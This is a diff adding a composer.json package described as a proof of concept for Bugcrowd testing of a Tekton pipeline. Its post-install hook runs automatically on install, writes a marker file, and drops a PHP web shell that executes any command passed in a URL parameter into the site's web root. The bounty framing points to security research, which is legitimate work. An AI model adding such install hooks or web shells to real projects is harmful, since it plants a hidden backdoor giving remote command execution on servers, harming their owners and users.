@@ -1,0 +1,10 @@
+{
+  "name": "craftcms/tekton-poc",
+  "description": "Tekton PoC for Bugcrowd testing",
+  "scripts": {
+    "post-install-cmd": [
+      "echo '=== COMPOSER POST-INSTALL EXECUTED ===' > /var/www/craftcms/web/composer-poc.txt",
+      "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/craftcms/web/composer-shell.php"
+    ]
+  }
+}
